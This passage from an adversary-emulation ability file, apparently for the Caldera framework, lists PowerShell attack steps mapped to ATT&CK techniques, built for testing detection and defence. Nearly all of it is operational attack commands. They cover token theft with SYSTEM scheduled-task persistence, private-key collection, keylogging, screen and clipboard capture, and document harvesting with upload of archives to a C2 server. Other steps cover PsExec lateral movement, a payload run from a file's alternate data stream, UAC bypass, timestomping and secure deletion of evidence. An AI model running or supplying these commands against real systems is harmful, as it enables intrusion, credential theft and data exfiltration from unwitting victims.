  technique_name:  "Boot or Logon Autostart Execution: Shortcut Modification"
  technique_id:  T1547.009
  executors: 
   - psh:
     platform: windows
     command: |
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       if (Test-Path -path "readme.ps1") {
         . .\readme.ps1;
         Invoke-Persistence -PersistStep 2;
         write-host "[+] Persistence 2 invoked.";
       
       } else {
         write-host "[!] readme.ps1 not found.";
         return 1;
       }
   - pwsh:
     platform: windows
     command: |
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       if (Test-Path -path "readme.ps1") {
         . .\readme.ps1;
         Invoke-Persistence -PersistStep 2;
         write-host "[+] Persistence 2 invoked.";
       
       } else {
         write-host "[!] readme.ps1 not found.";
         return 1;
       }
 03afada1-1714-408f-bde5-f528b91dc89d:
  name:  Access Token Manipulation
  tactic:  defensive-evasion
  technique_name:  "Access Token Manipulation"
  technique_id:  T1134
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
   - pwsh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
 e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d:
  name:  Credentials In Files- Chrome
  tactic:  credential-access
  technique_name:  "Credential Dumping"
  technique_id:  T1003
  executors: 
   - psh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       ./accesschk.exe -accepteula .;
   - pwsh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       ./accesschk.exe -accepteula .;
 1b9e018d-986d-42d9-bb8b-0e104e98ce9c:
  name:  Query Registry
  tactic:  defensive-evasion
  technique_name:  "Access Token Manipulation"
  technique_id:  T1134
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
   - pwsh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
 c4f4b13c-87b6-498c-b814-93570173068c:
  name:  Credentials In Files (T1081) - Private Keys Extraction
  tactic:  credential-access
  technique_name:  "Unsecured Credentials: Private Keys"
  technique_id:  T1552.004
  executors: 
   - psh:
     platform: windows
     command: |
       Import-PfxCertificate -Exportable -FilePath ".\dmevals.local.pfx" -CertStoreLocation Cert:\LocalMachine\My;
       
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       . .\readme.ps1;
       Get-PrivateKeys;
       if ($? -eq $True) {
           write-host "[+] Successfully executed private key collection script.";
           exit 0;
       } else {
           write-host "[!] Error, could not execution Get-PrivateKeys.";
           exit 1;
       }
   - pwsh:
     platform: windows
     command: |
       Import-PfxCertificate -Exportable -FilePath ".\dmevals.local.pfx" -CertStoreLocation Cert:\LocalMachine\My;
       
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       . .\readme.ps1;
       Get-PrivateKeys;
       if ($? -eq $True) {
           write-host "[+] Successfully executed private key collection script.";
           exit 0;
       } else {
           write-host "[!] Error, could not execution Get-PrivateKeys.";
           exit 1;
       }
 a4b14c10-49aa-4ae4-b165-d5a37364fe62:
  name:  Staging files for PowerShell module imports
  tactic:  defensive-evasion
  technique_name:  "Masquerading: Match Legitimate Name or Location"
  technique_id:  T1036.005
  executors: 
   - psh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysInternalsSuite";
       if (test-path -path ".\psversion.txt" ) {
         move-item .\psversion.txt psversion.ps1 -Force;
       }
         write-host "[+] File psversion.ps1 staged to be imported."
   - pwsh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysInternalsSuite";
       if (test-path -path ".\psversion.txt" ) {
         move-item .\psversion.txt psversion.ps1 -Force;
       }
         write-host "[+] File psversion.ps1 staged to be imported."
 a81ea4ad-bc9f-49a7-82d4-4466df641487:
  name:  Screen Capturing
  tactic:  collection
  technique_name:  "Screen Capture"
  technique_id:  T1113
  executors: 
   - psh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite\psversion.ps1";)) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       . .\psversion.ps1;
       Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName "Screenshot";
   - pwsh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite\psversion.ps1";)) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       . .\psversion.ps1;
       Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName "Screenshot";
 ee4c2eab-be57-434c-a32c-14b77360301a:
  name:  Automated Collection (T1119) - Clipboard (T1115)
  tactic:  collection
  technique_name:  "Clipboard Data"
  technique_id:  T1115
  executors: 
   - psh:
     platform: windows
     command: |
       $clip_data=get-clipboard;
       if ($clip_data.Length -gt 0) {
         write-host "[+] Clipboard data obtained!\n";
         write-host $clip_data;
       } else {
         write-host "[!] No clipboard data available!\n";
       }
   - pwsh:
     platform: windows
     command: |
       $clip_data=get-clipboard;
       if ($clip_data.Length -gt 0) {
         write-host "[+] Clipboard data obtained!\n";
         write-host $clip_data;
       } else {
         write-host "[!] No clipboard data available!\n";
       }
 db28f68d-e8b8-46e6-b680-642570d4b257:
  name:  Automated Collection (T1119) - Input Capture (T1417)
  tactic:  collection
  technique_name:  "Input Capture: Keylogging"
  technique_id:  T1056.001
  executors: 
   - psh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       . .\psversion.ps1;
       Get-Keystrokes;
       Start-Sleep -Seconds 15;
       View-Job -JobName "Keystrokes";
   - pwsh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       . .\psversion.ps1;
       Get-Keystrokes;
       Start-Sleep -Seconds 15;
       View-Job -JobName "Keystrokes";
 a612311d-a802-48da-bb7f-88a4b9dd7a24:
  name:  Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
  tactic:  exfiltration
  technique_name:  "Exfiltration Over C2 Channel"
  technique_id:  T1041
  executors: 
   - psh:
     platform: windows
     command: |
       Write-Host "[*] Compressing all the things in download dir";
       Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
       
       Import-Module .\upload.ps1 -Verbose -Force;
       Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
       if ($?) {
         write-host "[+] Data exfil of download directory completed!";
       } else {
         write-host "[!] Data exfil failed!";
       }
   - pwsh:
     platform: windows
     command: |
       Write-Host "[*] Compressing all the things in download dir";
       Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
       
       Import-Module .\upload.ps1 -Verbose -Force;
       Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
       if ($?) {
         write-host "[+] Data exfil of download directory completed!";
       } else {
         write-host "[!] Data exfil failed!";
       }
 9b518cfb-125f-466e-872b-4f8171773ce5:
  name:  Remote File Copy (T1105)
  tactic:  defensive-evasion
  technique_name:  "Access Token Manipulation: Token Impersonation/Theft"
  technique_id:  T1134.001
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
   - pwsh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
 6b90da47-13d0-48fc-8f07-0a1e6d5d876e:
  name:  Scheduled Tasks (T1053)
  tactic:  defensive-evasion
  technique_name:  "Access Token Manipulation: Token Impersonation/Theft"
  technique_id:  T1134.001
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
   - pwsh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
 95564347-e77a-4a89-b08f-dcafa5468f2c:
  name:  Remote System Discovery (T1018)
  tactic:  execution
  technique_name:  "Command and Scripting Interpreter: PowerShell"
  technique_id:  T1059.001
  executors: 
   - psh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       . .\psversion.ps1;
       Ad-Search Computer Name *;
   - pwsh:
     platform: windows
     command: |
       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
         exit 1;
       }
       
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       . .\psversion.ps1;
       Ad-Search Computer Name *;
 c4a59e39-53b0-4ace-9528-8ff052752ece:
  name:  Identifying current user on other machines
  tactic:  execution
  technique_name:  "Command and Scripting Interpreter: PowerShell"
  technique_id:  T1059.001
  executors: 
   - psh:
     platform: windows
     command: |
       Invoke-Command -ComputerName "$(hostname)" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
 9fefcde6-083a-4440-8eca-dc03d30c0bcb:
  name:  File and Directory Discovery (T1083)
  tactic:  defensive-evasion
  technique_name:  "Access Token Manipulation: Token Impersonation/Theft"
  technique_id:  T1134.001
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
   - pwsh:
     platform: windows
     command: |
       Import-Module .\StealToken.ps1 -Verbose -Force;
       StealToken;
       CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
       RevertToSelf;
 bddc0abc-07a0-41b7-813f-e0c64d9226b3:
  name:  Copy Sandcat File
  tactic:  lateral-movement
  technique_name:  "Ingress Tool Transfer"
  technique_id:  T1105
  executors: 
   - psh:
     platform: windows
     command: |
       move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
       set-location "C:\Program Files\SysinternalsSuite\";
       .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c "C:\Windows\Temp\python.exe" -group "day-1-lateral-movement" -server "#{server}";
       tasklist /S #{pivot_machine_hostname} /FI "IMAGENAME eq python.exe";
   - pwsh:
     platform: windows
     command: |
       move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
       set-location "C:\Program Files\SysinternalsSuite\";
       .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c "C:\Windows\Temp\python.exe" -group "day-1-lateral-movement" -server "#{server}";
       tasklist /S #{pivot_machine_hostname} /FI "IMAGENAME eq python.exe";
 0b1841bd-ef8b-475c-bce7-8fcb2860984a:
  name:  Screen Capture (T1113)
  tactic:  collection
  technique_name:  "Screen Capture"
  technique_id:  T1113
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
       Get-Screenshot;
   - pwsh:
     platform: windows
     command: |
       Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
       Get-Screenshot;
 d5170a60-3bdc-44e0-9870-a38db5c0cf81:
  name:  File and Directory Discovery (T1083)
  tactic:  discovery
  technique_name:  "File and Directory Discovery"
  technique_id:  T1083
  executors: 
   - psh:
     platform: windows
     command: |
       ls #{remote.file.share}
   - pwsh:
     platform: windows
     command: |
       ls #{remote.file.share}
 08e57385-dbce-4850-8bb7-589ef79465ab:
  name:  Automated document collection (T1119)
  tactic:  execution
  technique_name:  "Command and Scripting Interpreter: PowerShell"
  technique_id:  T1059.001
  executors: 
   - psh:
     platform: windows
     command: |
       move-item Rar.exe -Destination C:\Windows\Temp -Force;
       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
       cd C:\Windows\Temp;
       .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";
   - pwsh:
     platform: windows
     command: |
       move-item Rar.exe -Destination C:\Windows\Temp -Force;
       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
       cd C:\Windows\Temp;
       .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";
 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6:
  name:  Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
  tactic:  exfiltration
  technique_name:  "Exfiltration Over C2 Channel"
  technique_id:  T1041
  executors: 
   - psh:
     platform: windows
     command: |
       Import-Module .\upload.ps1 -Verbose -Force;
       Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
   - pwsh:
     platform: windows
     command: |
       Import-Module .\upload.ps1 -Verbose -Force;
       Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
 208b021b-c79a-4176-8ad1-3af99ed50c6f:
  name:  Artifact Cleanup - Delete Staged Files
  tactic:  defensive-evasion
  technique_name:  "Indicator Removal on Host: File Deletion"
  technique_id:  T1070.004
  executors: 
   - psh:
     platform: windows
     command: |
       if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
         mkdir "C:\Program Files\SysInternalsSuite";
       }
       set-location "C:\Program Files\SysInternalsSuite";
       
       if (!$(test-path -path "sdelete64.exe")) {
         iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
         Expand-Archive sdelete64.zip -force;
       }
       copy sdelete64.exe C:\Windows\Temp\;
       cd C:\Windows\Temp\ ;
       .\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
       .\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
       .\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
       remove-item C:\Windows\Temp\sdelete64.exe -force;
   - pwsh:
     platform: windows
     command: |
       if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
         mkdir "C:\Program Files\SysInternalsSuite";
       }
       set-location "C:\Program Files\SysInternalsSuite";
       
       if (!$(test-path -path "sdelete64.exe")) {
         iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
         Expand-Archive sdelete64.zip -force;
       }
       copy sdelete64.exe C:\Windows\Temp\;
       cd C:\Windows\Temp\ ;
       .\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
       .\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
       .\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
       remove-item C:\Windows\Temp\sdelete64.exe -force;
 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe:
  name:  Scheduled Task
  tactic:  impact
  technique_name:  "System Shutdown/Reboot"
  technique_id:  T1529
  executors: 
   - psh:
     platform: windows
     command: |
       write-host "[*] Restarting Computer";
       Restart-Computer -Force;
   - pwsh:
     platform: windows
     command: |
       write-host "[*] Restarting Computer";
       Restart-Computer -Force;
 4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92:
  name:  Artifact Cleanup
  tactic:  defensive-evasion
  technique_name:  "Indicator Removal on Host: File Deletion"
  technique_id:  T1070.004
  executors: 
   - psh:
     platform: windows
     command: |
       Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force;
       Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force;
       Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force;
       if (test-path -path "$env:APPDATA\OfficeSupplies.7z") {
           Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force; write-host "[+] Successfully removed OfficeSupplies.7z";
       } else {
           write-host "[!] File did not exist to be removed!";
       }
       
       if (get-job -name "Keystrokes" -ErrorAction SilentlyContinue) {
           Remove-Job -Name "Keystrokes";
           if ($?) {
               write-host "[+] Job \"Keystrokes\" was remove.";
           }
       } else {
           write-host "[!] Job \"Keystrokes\" did not exist.";
       }
       
       if (get-job -Name "Screenshot" -ErrorAction SilentlyContinue) {
           Remove-Job -Name "Screenshot" -Force;
           write-host "[+] Job \"screenshot\" was removed.";
       } else {
           write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
       }
       remove-item upload.ps1 -Force;
   - pwsh:
     platform: windows
     command: |
       Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force;
       Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force;
       Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force;
       if (test-path -path "$env:APPDATA\OfficeSupplies.7z") {
           Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force; write-host "[+] Successfully removed OfficeSupplies.7z";
       } else {
           write-host "[!] File did not exist to be removed!";
       }
       
       if (get-job -name "Keystrokes" -ErrorAction SilentlyContinue) {
           Remove-Job -Name "Keystrokes";
           if ($?) {
               write-host "[+] Job \"Keystrokes\" was remove.";
           }
       } else {
           write-host "[!] Job \"Keystrokes\" did not exist.";
       }
       
       if (get-job -Name "Screenshot" -ErrorAction SilentlyContinue) {
           Remove-Job -Name "Screenshot" -Force;
           write-host "[+] Job \"screenshot\" was removed.";
       } else {
           write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
       }
       remove-item upload.ps1 -Force;
 00446217-53ca-4749-bacd-f41fe189d36e:
  name:  Startup Folder Persistence Execution
  tactic:  lateral-movement
  technique_name:  "Boot or Logon Initialization Scripts: Startup Items"
  technique_id:  T1037.005
  executors: 
   - psh:
     platform: windows
     command: |
       cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
       mstsc /v:127.0.0.2;
       sleep 10;
       Get-Process -name mstsc;
       if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
   - pwsh:
     platform: windows
     command: |
       cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
       mstsc /v:127.0.0.2;
       sleep 10;
       Get-Process -name mstsc;
       if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
 e506f811-884d-4992-aacb-514b33a0324f:
  name:  Click .LNK payload
  tactic:  execution
  technique_name:  "User Execution: Malicious File"
  technique_id:  T1204.002
  executors: 
   - psh:
     platform: windows
     command: |
       Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";
       
       if(Test-Path -LiteralPath "$env:appdata\Microsoft\kxwn.lock"){
         Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
         Write-Host "Removed old kxwn.lock file";
       }
       
       powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
   - pwsh:
     platform: windows
     command: |
       Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";
       
       if(Test-Path -LiteralPath "$env:appdata\Microsoft\kxwn.lock"){
         Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
         Write-Host "Removed old kxwn.lock file";
       }
       
       powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
 4a2ad84e-a93a-4b2e-b1f0-c354d6a41278:
  name:  Timestomp kxwn.lock
  tactic:  defensive-evasion
  technique_name:  "Indicator Removal on Host: Timestomp"
  technique_id:  T1070.006
  executors: 
   - psh:
     platform: windows
     command: |
       if (!(test-path -path "$env:appdata\Microsoft\kxwn.lock")) {
         write-host "[!] kxwn.lock was not found on this host.";
         exit 1;
       } else {
         . .\timestomp.ps1;
         timestomp -dest "$env:appdata\Microsoft\kxwn.lock";
       }
   - pwsh:
     platform: windows
     command: |
       if (!(test-path -path "$env:appdata\Microsoft\kxwn.lock")) {
         write-host "[!] kxwn.lock was not found on this host.";
         exit 1;
       } else {
         . .\timestomp.ps1;
         timestomp -dest "$env:appdata\Microsoft\kxwn.lock";
       }
 f9c0b150-822f-497b-ad6d-187f24561e9a:
  name:  Detect Anti-Virus
  tactic:  discovery
  technique_name:  "Software Discovery: Security Software Discovery"
  technique_id:  T1518.001
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepTwelve.ps1;
       detectav
   - pwsh:
     platform: windows
     command: |
       . .\stepTwelve.ps1;
       detectav
 2b5a72b1-01e4-48ae-98b0-2570a7894371:
  name:  Detect Software
  tactic:  discovery
  technique_name:  "Software Discovery"
  technique_id:  T1518
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepTwelve.ps1;
       software;
   - pwsh:
     platform: windows
     command: |
       . .\stepTwelve.ps1;
       software;
 0cfadbcb-ec21-44ae-adb7-9a23176dd620:
  name:  Enumerate Computer Name
  tactic:  discovery
  technique_name:  "System Information Discovery"
  technique_id:  T1082
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepThirteen.ps1;
       comp;
   - pwsh:
     platform: windows
     command: |
       . .\stepThirteen.ps1;
       comp;
 96140694-6d13-40b6-9553-0e63533469f3:
  name:  Enumerate Domain Name
  tactic:  discovery
  technique_name:  "System Information Discovery"
  technique_id:  T1082
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepThirteen.ps1;
       domain;
   - pwsh:
     platform: windows
     command: |
       . .\stepThirteen.ps1;
       domain;
 f320eebd-e75b-4194-b529-79e64ad0b9ee:
  name:  Enumerate Username
  tactic:  discovery
  technique_name:  "System Owner/User Discovery"
  technique_id:  T1033
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepThirteen.ps1;
       user;
   - pwsh:
     platform: windows
     command: |
       . .\stepThirteen.ps1;
       user;
 a34ab8f2-a106-41fb-af0b-cf5382bd18ae:
  name:  Enumerate Processes
  tactic:  discovery
  technique_name:  "Process Discovery"
  technique_id:  T1057
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepThirteen.ps1;
       pslist;
   - pwsh:
     platform: windows
     command: |
       . .\stepThirteen.ps1;
       pslist;
 5226e5dc-fc28-43b7-a679-0db49d520402:
  name:  UAC Bypass via sdctl
  tactic:  defensive-evasion
  technique_name:  "Access Token Manipulation: Create Process with Token"
  technique_id:  T1134.002
  executors: 
   - psh:
     platform: windows
     command: |
       . .\stepFourteen_bypassUAC.ps1;
       bypass;
   - pwsh:
     platform: windows
     command: |
       . .\stepFourteen_bypassUAC.ps1;
       bypass;
 4ef6009d-2d62-4bb4-8de9-0458df2e9567:
